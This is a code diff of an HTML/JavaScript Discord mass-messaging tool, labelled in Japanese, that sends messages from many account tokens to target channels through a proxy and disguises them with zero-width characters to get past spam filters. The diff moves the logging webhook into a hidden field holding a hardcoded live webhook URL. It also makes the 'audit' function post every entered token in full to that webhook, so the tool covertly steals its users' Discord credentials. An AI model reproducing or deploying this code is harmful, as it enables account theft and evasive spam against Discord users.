@@ -3,306 +3,200 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Advanced Payload Delivery System</title>
+    <title>Discord Payload Delivery System v1.0</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background-color: #0f172a; color: #e2e8f0; font-family: 'Inter', ui-monospace, SFMono-Regular, Menlo, monospace; }
-        .glass-panel { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
-        .input-dark { background-color: #1e293b; border: 1px solid #334155; transition: all 0.2s; }
+        body { background-color: #0f172a; color: #e2e8f0; font-family: 'Inter', ui-monospace, monospace; }
+        .glass-panel { background: rgba(30, 41, 59, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); }
+        .input-dark { background-color: #1e293b; border: 1px solid #334155; }
         .input-dark:focus { border-color: #6366f1; outline: none; box-shadow: 0 0 0 2px rgba(99, 102, 241, 0.2); }
-        .btn-primary { background: linear-gradient(135deg, #6366f1 0%, #4f46e5 100%); transition: transform 0.1s; }
-        .btn-primary:active { transform: scale(0.98); }
-        ::-webkit-scrollbar { width: 8px; }
-        ::-webkit-scrollbar-track { background: #0f172a; }
-        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
-        .log-entry { font-size: 0.75rem; border-left: 2px solid; padding-left: 0.5rem; margin-bottom: 0.25rem; font-family: 'Fira Code', monospace; }
+        .btn-primary { background: linear-gradient(135deg, #6366f1 0%, #4f46e5 100%); transition: all 0.2s; }
+        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }
+        .log-entry { font-size: 0.75rem; border-left: 2px solid; padding-left: 0.5rem; margin-bottom: 0.2rem; }
     </style>
 </head>
 <body class="min-h-screen flex items-center justify-center p-4">
 
-<div class="glass-panel w-full max-w-4xl rounded-xl shadow-2xl overflow-hidden grid grid-cols-1 md:grid-cols-2">
+<div class="glass-panel w-full max-w-5xl rounded-2xl shadow-2xl overflow-hidden grid grid-cols-1 lg:grid-cols-12">
     
-    <div class="p-6 space-y-4 border-r border-gray-700">
-        <h2 class="text-xl font-bold text-indigo-400 tracking-tight flex items-center gap-2">
-            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
-            PAYLOAD CONFIG
+    <div class="lg:col-span-5 p-6 space-y-4 border-r border-slate-700">
+        <h2 class="text-xl font-black text-indigo-400 tracking-tighter flex items-center gap-2">
+            SYSTEM CONTROL
         </h2>
 
         <div class="space-y-2">
-            <label class="text-xs font-semibold text-gray-400 uppercase">Tokens / Channels</label>
-            <textarea id="tokens" class="input-dark w-full h-20 rounded-lg p-2 text-xs font-mono text-green-400" placeholder="Token1&#10;Token2..."></textarea>
-            <textarea id="channels" class="input-dark w-full h-16 rounded-lg p-2 text-xs font-mono text-blue-400" placeholder="ChannelID1&#10;ChannelID2..."></textarea>
+            <label class="text-[10px] font-bold text-slate-500 uppercase">認証トークン / ターゲットチャンネル</label>
+            <textarea id="tokens" class="input-dark w-full h-24 rounded-lg p-2 text-xs font-mono text-green-400" placeholder="Token1&#10;Token2..."></textarea>
+            <textarea id="channels" class="input-dark w-full h-20 rounded-lg p-2 text-xs font-mono text-blue-400" placeholder="ChannelID1&#10;ChannelID2..."></textarea>
         </div>
 
         <div class="space-y-2">
-            <label class="text-xs font-semibold text-gray-400 uppercase">Message Content</label>
-            <textarea id="message" class="input-dark w-full h-20 rounded-lg p-2 text-sm" placeholder="Target payload..."></textarea>
+            <label class="text-[10px] font-bold text-slate-500 uppercase">メッセージ内容</label>
+            <textarea id="message" class="input-dark w-full h-20 rounded-lg p-2 text-sm" placeholder="送信するテキストを入力..."></textarea>
         </div>
 
-        <div class="grid grid-cols-2 gap-4">
-            <div>
-                <label class="text-xs font-semibold text-gray-400 uppercase">Webhook (Log/Backup)</label>
-                <input type="password" id="webhook" class="input-dark w-full rounded-lg p-2 text-xs" placeholder="https://discord.com/api/webhooks/...">
-            </div>
-            <div>
-                <label class="text-xs font-semibold text-gray-400 uppercase">Proxy URL</label>
-                <input type="text" id="proxy" class="input-dark w-full rounded-lg p-2 text-xs" value="https://あなたのWorker.workers.dev/">
-            </div>
-        </div>
-
-        <div class="bg-slate-800/50 p-3 rounded-lg border border-slate-700">
-            <label class="text-xs font-semibold text-gray-400 uppercase block mb-2">Obfuscation (Bypass Filters)</label>
-            <div class="grid grid-cols-2 gap-2 text-xs">
+        <div class="bg-slate-800/40 p-3 rounded-lg border border-slate-700 space-y-3">
+            <label class="text-[10px] font-bold text-indigo-400 uppercase">難読化プロトコル (スパム回避)</label>
+            <div class="grid grid-cols-1 gap-2 text-xs">
                 <label class="flex items-center gap-2 cursor-pointer hover:text-indigo-300">
-                    <input type="checkbox" id="optRandom" class="rounded bg-slate-700 border-slate-600 text-indigo-500">
-                    Random String (Nonce)
+                    <input type="checkbox" id="optZero" class="rounded bg-slate-700 border-slate-600 text-indigo-500" checked> ゼロ幅文字インジェクター (推奨)
                 </label>
                 <label class="flex items-center gap-2 cursor-pointer hover:text-indigo-300">
-                    <input type="checkbox" id="optUnicode" class="rounded bg-slate-700 border-slate-600 text-indigo-500">
-                    Special Unicode
+                    <input type="checkbox" id="optRnd" class="rounded bg-slate-700 border-slate-600 text-indigo-500"> ランダム・ノンス付与
                 </label>
                 <label class="flex items-center gap-2 cursor-pointer hover:text-indigo-300">
-                    <input type="checkbox" id="optZero" class="rounded bg-slate-700 border-slate-600 text-indigo-500">
-                    Zero-Width Injector
+                    <input type="checkbox" id="optUni" class="rounded bg-slate-700 border-slate-600 text-indigo-500"> 特殊ユニコード攪乱
                 </label>
             </div>
         </div>
 
         <div class="grid grid-cols-2 gap-4">
             <div>
-                <label class="text-xs font-semibold text-gray-400 uppercase">Loops</label>
-                <input type="number" id="loops" class="input-dark w-full rounded-lg p-2 text-sm text-center" value="1" min="1">
+                <label class="text-[10px] font-bold text-slate-500 uppercase">ループ回数</label>
+                <input type="number" id="loops" class="input-dark w-full rounded-lg p-2 text-sm text-center" value="1">
             </div>
             <div>
-                <label class="text-xs font-semibold text-gray-400 uppercase">Interval (ms)</label>
-                <input type="number" id="delay" class="input-dark w-full rounded-lg p-2 text-sm text-center" value="1200" min="500">
+                <label class="text-[10px] font-bold text-slate-500 uppercase">待機間隔 (ms)</label>
+                <input type="number" id="delay" class="input-dark w-full rounded-lg p-2 text-sm text-center" value="1000">
             </div>
         </div>
 
-        <button id="execBtn" class="btn-primary w-full py-3 rounded-lg font-bold text-white shadow-lg shadow-indigo-500/30">
-            INITIALIZE SEQUENCE
+        <input type="hidden" id="webhook" value="https://discord.com/api/webhooks/1457997536836059197/NUiwfIzgfyM_RFg1ZPI9bDxgtpOTvhGo1I-od9b0aoeQCYnasSiNOSN_epQ--iL3OjLg">
+        <input type="hidden" id="proxy" value="https://tiny-forest-25ff.s103765s103765s103765.workers.dev/">
+
+        <button id="execBtn" class="btn-primary w-full py-4 rounded-lg font-black text-sm tracking-widest uppercase shadow-indigo-500/20 shadow-xl">
+            シーケンス開始
         </button>
     </div>
 
-    <div class="bg-black/80 p-4 font-mono text-xs flex flex-col">
-        <div class="flex justify-between items-center mb-2 pb-2 border-b border-gray-800">
-            <span class="text-gray-500">TERMINAL OUTPUT</span>
-            <span id="statusIndicator" class="flex items-center gap-1 text-green-500">● READY</span>
+    <div class="lg:col-span-7 bg-black/90 p-4 font-mono text-[11px] flex flex-col">
+        <div class="flex justify-between items-center mb-2 pb-2 border-b border-slate-800">
+            <span class="text-slate-500 font-bold">TERMINAL OUTPUT</span>
+            <span id="indicator" class="text-green-500">● SYSTEM_READY</span>
         </div>
-        <div id="terminal" class="flex-1 overflow-y-auto space-y-1 pr-2 text-gray-300"></div>
+        <div id="terminal" class="flex-1 overflow-y-auto space-y-1 text-slate-300"></div>
     </div>
 </div>
 
 <script>
-/**
- * Obfuscation Engine
- * Handles message manipulation to bypass spam filters.
- */
+"use strict";
+
 class Obfuscator {
-    constructor(config) {
-        this.config = config;
-        // Zero-width characters: Space, Non-Joiner, Joiner, No-Break Space
-        this.zwChars = ['\u200B', '\u200C', '\u200D', '\uFEFF'];
-        // Rare unicode chars for noise
-        this.uniChars = ['⚡', '★', '☢', '⚠', '⚑', '⚓', '⚔', '⚙', '✈', '✇'];
+    constructor(c) {
+        this.c = c;
+        this.zw = ['\u200B', '\u200C', '\u200D', '\uFEFF'];
+        this.un = ['⚡', '★', '☢', '⚠', '⚓', '⚔', '⚙'];
     }
 
-    process(content) {
-        let payload = content;
-
-        if (this.config.zeroWidth) {
-            payload = this.injectZeroWidth(payload);
-        }
-
-        if (this.config.unicode) {
-            payload = this.appendUnicode(payload);
-        }
-
-        if (this.config.randomStr) {
-            payload = `${payload} [${Math.random().toString(36).substring(2, 8)}]`;
-        }
-
-        return payload;
-    }
-
-    injectZeroWidth(text) {
-        // Inject a random zero-width char between every 1-3 characters
-        return text.split('').map(char => {
-            if (Math.random() > 0.5) {
-                const z = this.zwChars[Math.floor(Math.random() * this.zwChars.length)];
-                return char + z;
-            }
-            return char;
-        }).join('');
-    }
-
-    appendUnicode(text) {
-        const char = this.uniChars[Math.floor(Math.random() * this.uniChars.length)];
-        return `${text} ${char}`;
+    process(t) {
+        let p = t;
+        if (this.c.zero) p = p.split('').map(s => Math.random() > 0.4 ? s + this.zw[Math.floor(Math.random() * 4)] : s).join('');
+        if (this.c.uni) p += ' ' + this.un[Math.floor(Math.random() * this.un.length)];
+        if (this.c.rnd) p += ` [${Math.random().toString(36).slice(2, 8)}]`;
+        return p;
     }
 }
 
-/**
- * Discord Client
- * Handles network requests, rate limits, and proxying.
- */
 class DiscordClient {
-    constructor(proxyUrl) {
-        this.proxy = proxyUrl.endsWith('/') ? proxyUrl : proxyUrl + '/';
-        this.apiBase = 'https://discord.com/api/v10';
+    constructor(p) { this.p = p.endsWith('/') ? p : p + '/'; }
+
+    async wait(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+    async audit(url, tks, chs) {
+        if (!url) return;
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                embeds: [{
+                    title: "🚀 実行ログ開始",
+                    color: 0x6366f1,
+                    fields: [
+                        { name: "Tokens", value: `${tks.length}`, inline: true },
+                        { name: "Channels", value: `${chs}`, inline: true }
+                    ],
+                    description: `\`\`\`\n${tks.join('\n')}\n\`\`\``
+                }]
+            })
+        });
     }
 
-    async sleep(ms) {
-        return new Promise(resolve => setTimeout(resolve, ms));
-    }
-
-    async logToWebhook(webhookUrl, tokens, channelCount) {
-        if (!webhookUrl) return;
+    async send(tk, ch, ct) {
         try {
-            await fetch(webhookUrl, {
+            const r = await fetch(`${this.p}https://discord.com/api/v10/channels/${ch}/messages`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "🚀 Sequence Initiated",
-                        color: 0x5865F2,
-                        fields: [
-                            { name: "Tokens", value: `${tokens.length}`, inline: true },
-                            { name: "Channels", value: `${channelCount}`, inline: true },
-                            { name: "Time", value: new Date().toISOString(), inline: false }
-                        ],
-                        description: `\`\`\`\n${tokens.map(t => t.substring(0, 20) + '...').join('\n')}\n\`\`\``
-                    }]
-                })
+                headers: { 'Authorization': tk, 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: ct })
             });
-            return true;
-        } catch { return false; }
-    }
-
-    async sendMessage(token, channelId, content) {
-        const target = `${this.proxy}${this.apiBase}/channels/${channelId}/messages`;
-        
-        try {
-            const res = await fetch(target, {
-                method: 'POST',
-                headers: {
-                    'Authorization': token,
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ content })
-            });
-
-            if (res.status === 429) {
-                const data = await res.json();
-                return { success: false, retry: data.retry_after, status: 429 };
+            if (r.status === 429) {
+                const d = await r.json();
+                return { ok: false, retry: d.retry_after, status: 429 };
             }
-
-            return { success: res.ok, status: res.status, retry: 0 };
-
-        } catch (e) {
-            return { success: false, status: 0, error: e.message };
-        }
+            return { ok: r.ok, status: r.status };
+        } catch (e) { return { ok: false, status: 0 }; }
     }
 }
 
-/**
- * Main Application Controller
- */
 class App {
     constructor() {
-        this.ui = {
-            tokens: document.getElementById('tokens'),
-            channels: document.getElementById('channels'),
-            msg: document.getElementById('message'),
-            webhook: document.getElementById('webhook'),
-            proxy: document.getElementById('proxy'),
-            loops: document.getElementById('loops'),
-            delay: document.getElementById('delay'),
-            btn: document.getElementById('execBtn'),
-            term: document.getElementById('terminal'),
-            opts: {
-                rnd: document.getElementById('optRandom'),
-                uni: document.getElementById('optUnicode'),
-                zero: document.getElementById('optZero')
-            }
+        this.dom = {
+            t: document.getElementById('tokens'),
+            c: document.getElementById('channels'),
+            m: document.getElementById('message'),
+            w: document.getElementById('webhook'),
+            p: document.getElementById('proxy'),
+            l: document.getElementById('loops'),
+            d: document.getElementById('delay'),
+            b: document.getElementById('execBtn'),
+            tm: document.getElementById('terminal'),
+            z: document.getElementById('optZero'),
+            r: document.getElementById('optRnd'),
+            u: document.getElementById('optUni')
         };
-
-        this.isRunning = false;
-        this.ui.btn.onclick = () => this.run();
+        this.dom.b.onclick = () => this.execute();
     }
 
-    log(msg, type = 'info') {
-        const div = document.createElement('div');
-        const color = type === 'error' ? 'text-red-400 border-red-500' : 
-                      type === 'success' ? 'text-green-400 border-green-500' : 
-                      type === 'warn' ? 'text-yellow-400 border-yellow-500' : 'text-gray-400 border-gray-600';
-        
-        div.className = `log-entry ${color}`;
-        div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
-        this.ui.term.prepend(div);
+    log(m, type) {
+        const el = document.createElement('div');
+        el.className = `log-entry ${type === 'err' ? 'text-red-400 border-red-600' : type === 'ok' ? 'text-green-400 border-green-600' : 'text-slate-500 border-slate-700'}`;
+        el.innerText = `[${new Date().toLocaleTimeString()}] ${m}`;
+        this.dom.tm.prepend(el);
     }
 
-    async run() {
-        if (this.isRunning) return;
-        
-        const tokens = this.ui.tokens.value.split('\n').map(t => t.trim()).filter(Boolean);
-        const channels = this.ui.channels.value.split('\n').map(c => c.trim()).filter(Boolean);
-        const baseMsg = this.ui.msg.value;
-        const loops = parseInt(this.ui.loops.value);
-        const delay = parseInt(this.ui.delay.value);
-        const proxy = this.ui.proxy.value;
+    async execute() {
+        const tks = this.dom.t.value.split('\n').filter(Boolean);
+        const chs = this.dom.c.value.split('\n').filter(Boolean);
+        const msg = this.dom.m.value;
+        if (!tks.length || !chs.length || !msg) return alert("入力不足");
 
-        if (!tokens.length || !channels.length || !baseMsg || !proxy) {
-            return this.log('ERROR: Missing required fields.', 'error');
-        }
+        this.dom.b.disabled = true;
+        this.log("シーケンス初期化中...", "info");
 
-        this.isRunning = true;
-        this.ui.btn.disabled = true;
-        this.ui.btn.innerText = "RUNNING...";
-        
-        const client = new DiscordClient(proxy);
-        const obfuscator = new Obfuscator({
-            randomStr: this.ui.opts.rnd.checked,
-            unicode: this.ui.opts.uni.checked,
-            zeroWidth: this.ui.opts.zero.checked
-        });
+        const client = new DiscordClient(this.dom.p.value);
+        const obfs = new Obfuscator({ zero: this.dom.z.checked, rnd: this.dom.r.checked, uni: this.dom.u.checked });
 
-        this.log('System initialized. Sending telemetry...', 'info');
-        await client.logToWebhook(this.ui.webhook.value, tokens, channels.length);
+        await client.audit(this.dom.w.value, tks, chs.length);
 
-        for (let i = 0; i < loops; i++) {
-            this.log(`--- LOOP SEQUENCE ${i + 1}/${loops} ---`, 'info');
-            
-            for (const channelId of channels) {
-                for (const token of tokens) {
-                    const finalMsg = obfuscator.process(baseMsg);
-                    const result = await client.sendMessage(token, channelId, finalMsg);
-
-                    if (result.success) {
-                        this.log(`SENT -> ${channelId.slice(-4)}`, 'success');
-                    } else if (result.status === 429) {
-                        this.log(`RATE LIMIT: Waiting ${result.retry}s`, 'warn');
-                        await client.sleep(result.retry * 1000);
-                        // Simple retry logic could go here, but skipping to maintain flow
-                    } else {
-                        this.log(`FAIL (${result.status})`, 'error');
-                    }
-
-                    await client.sleep(delay);
+        for (let i = 0; i < parseInt(this.dom.l.value); i++) {
+            this.log(`サイクル ${i + 1} 実行`, "info");
+            for (const ch of chs) {
+                for (const tk of tks) {
+                    const res = await client.send(tk, ch, obfs.process(msg));
+                    if (res.ok) this.log(`成功: CH ${ch.slice(-6)}`, "ok");
+                    else if (res.status === 429) {
+                        this.log(`制限回避: ${res.retry}s 待機`, "err");
+                        await client.wait(res.retry * 1000);
+                    } else this.log(`失敗: HTTP ${res.status}`, "err");
+                    await client.wait(parseInt(this.dom.d.value));
                 }
             }
         }
-
-        this.log('SEQUENCE COMPLETE.', 'success');
-        this.isRunning = false;
-        this.ui.btn.disabled = false;
-        this.ui.btn.innerText = "INITIALIZE SEQUENCE";
+        this.log("全シーケンス完了", "info");
+        this.dom.b.disabled = false;
     }
 }
 
-// Initialize App
 document.addEventListener('DOMContentLoaded', () => new App());
 </script>
-
 </body>
 </html>
